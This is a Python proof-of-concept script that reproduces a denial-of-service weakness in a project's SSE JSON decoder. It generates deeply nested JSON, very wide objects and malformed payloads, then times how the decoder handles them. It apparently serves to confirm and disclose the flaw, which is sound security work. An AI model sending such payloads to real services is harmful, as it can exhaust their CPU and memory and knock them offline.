#!/usr/bin/env python3
"""
Reproduction script for DoS vulnerability in SSE JSON parsing.

This script demonstrates how a maliciously crafted JSON payload can cause 
high CPU usage and memory consumption due to deep nesting in the SSE decoder.
"""

import json
import time
import sys
import os

# Add src to path to import the vulnerable code
src_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
sys.path.insert(0, src_path)

from src.core.transport.fastapi.adapters.sse.decoder import SSEDecoder


def create_nested_json_depth(depth: int) -> str:
    """Create a deeply nested JSON structure that can cause DoS."""
    if depth <= 0:
        return '"leaf"'
    
    return json.dumps({"nested": json.loads(create_nested_json_depth(depth - 1))})


def create_breadth_json_size(size: int) -> str:
    """Create a wide JSON structure with many properties."""
    obj = {}
    for i in range(size):
        obj[f"key_{i}"] = f"value_{i}"
    return json.dumps(obj)


def test_vulnerability():
    """Test the DoS vulnerability in SSE decoder."""
    decoder = SSEDecoder()
    
    print("Testing SSE Decoder DoS Vulnerability")
    print("=" * 50)
    
    # Test 1: Deep nesting attack
    print("\n1. Testing deep nesting attack...")
    for depth in [100, 500, 1000]:
        try:
            malicious_json = create_nested_json_depth(depth)
            sse_payload = f"data: {malicious_json}"
            
            print(f"   Testing depth {depth} (size: {len(malicious_json)} chars)...")
            
            start_time = time.time()
            result = decoder.decode_payload(sse_payload)
            end_time = time.time()
            
            print(f"   [OK] Completed in {end_time - start_time:.3f}s")
            
        except RecursionError:
            print(f"   [ERROR] RecursionError at depth {depth}")
            break
        except Exception as e:
            print(f"   [ERROR] Error at depth {depth}: {e}")
            break
    
    # Test 2: Large payload attack
    print("\n2. Testing large payload attack...")
    for size in [1000, 10000, 100000]:
        try:
            malicious_json = create_breadth_json_size(size)
            sse_payload = f"data: {malicious_json}"
            
            print(f"   Testing {size} properties (size: {len(malicious_json)} chars)...")
            
            start_time = time.time()
            result = decoder.decode_payload(sse_payload)
            end_time = time.time()
            
            print(f"   [OK] Completed in {end_time - start_time:.3f}s")
            
        except MemoryError:
            print(f"   [ERROR] MemoryError at size {size}")
            break
        except Exception as e:
            print(f"   [ERROR] Error at size {size}: {e}")
            break
    
    # Test 3: Malformed JSON that causes slow parsing
    print("\n3. Testing malformed JSON attack...")
    malformed_payloads = [
        'data: {' + 'a' * 10000 + ':',  # Incomplete JSON
        'data: [' + '{"a":' * 1000,    # Many incomplete nested objects
        'data: {"a":' + '"' + '\\"' * 10000,  # Massive escaped string
    ]
    
    for i, payload in enumerate(malformed_payloads, 1):
        try:
            print(f"   Testing malformed payload {i}...")
            
            start_time = time.time()
            result = decoder.decode_payload(payload)
            end_time = time.time()
            
            print(f"   [OK] Completed in {end_time - start_time:.3f}s")
            
        except Exception as e:
            print(f"   [ERROR] Error with payload {i}: {type(e).__name__}")


if __name__ == "__main__":
    test_vulnerability()
    print("\n" + "=" * 50)
    print("Vulnerability reproduction completed!")
    print("This demonstrates the DoS potential in the SSE decoder.")